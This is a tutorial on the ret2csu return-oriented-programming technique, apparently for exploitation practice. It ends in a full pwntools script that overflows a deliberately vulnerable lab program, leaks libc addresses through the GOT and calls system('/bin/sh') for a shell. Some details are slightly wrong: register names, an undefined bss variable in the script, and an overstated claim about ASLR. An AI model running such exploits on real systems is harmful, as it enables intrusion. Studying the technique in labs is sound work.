# ret2_csu_init

## What's this?
A "universal" ROP gadget.

Take a look at `__libc_csu_init`
```
[0x00400450]> pdf @ sym.__libc_csu_init 
/ (fcn) sym.__libc_csu_init 101
|   sym.__libc_csu_init ();
|              ; DATA XREF from 0x00400466 (entry0)
|           0x00400590      4157           push r15
|           0x00400592      4156           push r14
|           0x00400594      4989d7         mov r15, rdx
|           0x00400597      4155           push r13
|           0x00400599      4154           push r12
|           0x0040059b      4c8d255e0820.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start ; 0x600e00 ; "0\x05@"
|           0x004005a2      55             push rbp
|           0x004005a3      488d2d5e0820.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end ; 0x600e08
|           0x004005aa      53             push rbx
|           0x004005ab      4189fd         mov r13d, edi
|           0x004005ae      4989f6         mov r14, rsi
|           0x004005b1      4c29e5         sub rbp, r12
|           0x004005b4      4883ec08       sub rsp, 8
|           0x004005b8      48c1fd03       sar rbp, 3
|           0x004005bc      e847feffff     call sym._init
|           0x004005c1      4885ed         test rbp, rbp
|       ,=< 0x004005c4      7420           je 0x4005e6
|       |   0x004005c6      31db           xor ebx, ebx
|       |   0x004005c8      0f1f84000000.  nop dword [rax + rax]
|       |      ; JMP XREF from 0x004005e4 (sym.__libc_csu_init)
|      .--> 0x004005d0      4c89fa         mov rdx, r15
|      :|   0x004005d3      4c89f6         mov rsi, r14
|      :|   0x004005d6      4489ef         mov edi, r13d
|      :|   0x004005d9      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x004005dd      4883c301       add rbx, 1
|      :|   0x004005e1      4839dd         cmp rbp, rbx
|      `==< 0x004005e4      75ea           jne 0x4005d0
|       |      ; JMP XREF from 0x004005c4 (sym.__libc_csu_init)
|       `-> 0x004005e6      4883c408       add rsp, 8
|           0x004005ea      5b             pop rbx
|           0x004005eb      5d             pop rbp
|           0x004005ec      415c           pop r12
|           0x004005ee      415d           pop r13
|           0x004005f0      415e           pop r14
|           0x004005f2      415f           pop r15
\           0x004005f4      c3             ret

```

(Addresses may differ across binaries but instructions should be almost completely the same)

There are 2 key parts that we can look at.

### First part
At `0x4005ea`, we have this really beautiful gadget that allows us to populate 6 different registers. Let's call this "csu part 1".
```
|           0x004005ea      5b             pop rbx
|           0x004005eb      5d             pop rbp
|           0x004005ec      415c           pop r12
|           0x004005ee      415d           pop r13
|           0x004005f0      415e           pop r14
|           0x004005f2      415f           pop r15
\           0x004005f4      c3             ret
```

But... those are pretty useless registers...

### Second part
Now let's look at `0x4005d0`. Let's call this "csu part 2".
```
|      .--> 0x004005d0      4c89fa         mov rdx, r15
|      :|   0x004005d3      4c89f6         mov rsi, r14
|      :|   0x004005d6      4489ef         mov edi, r13d
|      :|   0x004005d9      41ff14dc       call qword [r12 + rbx*8]
|      :|   0x004005dd      4883c301       add rbx, 1
|      :|   0x004005e1      4839dd         cmp rbp, rbx
|      `==< 0x004005e4      75ea           jne 0x4005d0
|       |      ; JMP XREF from 0x004005c4 (sym.__libc_csu_init)
|       `-> 0x004005e6      4883c408       add rsp, 8
|           0x004005ea      5b             pop rbx
|           0x004005eb      5d             pop rbp
|           0x004005ec      415c           pop r12
|           0x004005ee      415d           pop r13
|           0x004005f0      415e           pop r14
|           0x004005f2      415f           pop r15
\           0x004005f4      c3             ret
```

The useless registers we control earlier are being moved into `edi`, `rsi` and `rdi`, which are the registers storing function arguments in 64 bit. We are not done yet, look at `0x4005d9`. 

```
0x004005d9      41ff14dc       call qword [r12 + rbx*8]
```

We can even control where the program can jump to. By setting `rbx` to 0 and `r12` to the address containing the address of our function, we can call that function. For instance, the GOT.

Looking at the next 3 instructions

```
0x004005dd      4883c301       add rbx, 1
0x004005e1      4839dd         cmp rbp, rbx
0x004005e4      75ea           jne 0x4005d0
```

We see that the program compares `rbp` and `rbx`, and if they are different, it will go back to the top of "csu part 1". Since just now we set `rbx` to 0, we should set `rbp` to 1, so that they can be the same and we avoid the `jne` instruction.

### Back to where we started
Now we are back to csu part 1, or almost. With an extra instruction,
```
0x004005e6      4883c408       add rsp, 8
```

Either we can do another ret2_csu_init attack, or return to somewhere else.

### Summary
In short,
1) csu part 1 allows us to control 6 registers
2) csu part 2 allows us to make those 6 registers useful to execute any function we like
3) Defeats ASLR

### Limitations
1) We may need quite a big buffer overflow since we need to fill in 6 different 64-bit registers.
2) Need to bypass PIE or CANARY first.

## Example - level 5 from [ROP_STEP_BY_STEP](https://github.com/zhengmin1989/ROP_STEP_BY_STEP/tree/master/linux_x64)
### Source
```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
	char buf[128];
	read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
	write(STDOUT_FILENO, "Hello, World\n", 13);
	vulnerable_function();
}
```

Compile with `fno-pie` and `fno-stack-protector`.

The binary provided in the link above is compiled using a very old gcc, so the csu function uses `mov` instructions instead of `pop`. However functionality in general is the same.

### Exploit
Using a De-Brujin pattern we can obtain that the offset is 136.

Prepare our exploit script with pwntools.
```python
from pwn import *
from LibcSearcher import *

# obtained from https://github.com/zhengmin1989/ROP_STEP_BY_STEP/tree/master/linux_x64
binary_name = 'level5'
p = process(binary_name)
elf = ELF(binary_name)

offset = 136

csu1 = 0x4005ea
csu2 = 0x4005d0
```

We can make a function to prepare a ret2_csu_init payload.
```python
def csu(func_addr, edi, rsi, rdx, ret):
	payload = ''
	payload += p64(csu1)		# overwrite ret addr
	payload += p64(0)	 		# rbx 
	payload += p64(1)			# rbp
	payload += p64(func_addr)	# pop r12 -> call qword ptr[r12 + rbx * 8]
	payload += p64(edi)			# pop r13 -> mov edi, r13d
	payload += p64(rsi)			# pop r14 -> mov rsi, r14
	payload += p64(rdx)			# pop r15 -> mov rdx, r15
	payload += p64(csu2)		# after popping everything, we ret to csu2

	# earlier, we set rbx = 0, rbp = 1
	# rbx = rbx + 1 -> rbx = 1
	# rbp = 1
	# cmp rbx, rbp will set ZF=1
	# jne 0x4005d0 will be ignored
	payload += 'a' * 7 * 8		# just fill up the stack, because add rsp, 8 and 6 more pops
	payload += p64(ret)			# return addr
	return payload
```

Now, we can make use of csu to leak `write` and `read` from GOT so that we can infer the libc version.
```py
# addresses
main = elf.symbols['main']
write_got = elf.got['write']
read_got = elf.got['read']

# first step, we want to leak libc version, can do that by leaking GOT entry of write and read
p.recvuntil('Hello, World\n')
log.info('Leaking write libc address')
payload = 'a' * offset
payload += csu(write_got, 1, write_got, 8, main)
p.send(payload)

write_leak = u64(p.recv(8))
log.success("Leaked write libc address: 0x%x" % write_leak)

# leak GOT of read
p.recvuntil('Hello, World\n')
log.info('Leaking read libc address')
payload = 'a' * offset
payload += csu(write_got, 1, read_got, 8, main)
p.send(payload)

read_leak = u64(p.recv(8))
log.success("Leaked read libc address: 0x%x" % read_leak)

# get libc
libc = LibcSearcher('write', write_leak)
libc.add_condition('read', read_leak)
libc_base = write_leak - libc.dump('write')
log.success('Libc base: 0x%x' % libc_base)
```

Then, we can write the address to `system` and `'/bin/sh'` in `.bss`
```python
# ok now we want to do system('/bin/sh'), so read '/bin/sh' and address of system into bss
p.recvuntil('Hello, World\n')
log.info('Writing system address and /bin/sh into bss')
payload = 'a' * offset
payload += csu(read_got, 0, bss, 16, main)
p.send(payload)
system_libc = libc_base + libc.dump('system')
payload = p64(system_libc)
payload += '/bin/sh\x00'
p.send(payload)
```

Finally, call `system` and get shell
```python
# now we can just call system
p.recvuntil('Hello, World\n')
payload = 'a' * offset
payload += csu(bss, bss + 8, 0, 0, main)
p.send(payload)
p.interactive()
```

### Extra tips
Notice that the `csu` payload above uses a whopping 128 bytes. Not so ideal. There are some workarounds to this.

#### Control `rbx` and `rbp` before hand
All we care is to set `rbx = 0`, `rbp = 1`. So we can possibly do this only once and reduce 16 bytes in the future payloads.

#### Send in 2 rounds of input for the exploit
Clearly this exploit has 2 parts, as stated earlier. If we can ensure the integrity of the `r12-15` registers, we can split this exploit into 2 different payloads.

### Other gadgets
All we see in the disassembly above is the supposed instructions to be executed in those addresses. Let's look at the intermediate addresses.

```
[0x00400450]> pi 7 @ 0x4005ea
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
[0x00400450]> pi 6 @ 0x4005eb
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
[0x00400450]> pi 5 @ 0x4005ec
pop r12
pop r13
pop r14
pop r15
ret
[0x00400450]> pi 5 @ 0x4005ed
pop rsp
pop r13
pop r14
pop r15
ret
[0x00400450]> pi 4 @ 0x4005ee
pop r13
pop r14
pop r15
ret
[0x00400450]> pi 4 @ 0x4005ef
pop rbp
pop r14
pop r15
ret
[0x00400450]> pi 3 @ 0x4005f0
pop r14
pop r15
ret
[0x00400450]> pi 3 @ 0x4005f1
pop rsi
pop r15
ret
[0x00400450]> pi 2 @ 0x4005f2
pop r15
ret
[0x00400450]> pi 2 @ 0x4005f3
pop rdi
ret
[0x00400450]> pi 1 @ 0x4005f4
ret
```

Cool stuff. (useful for BROP)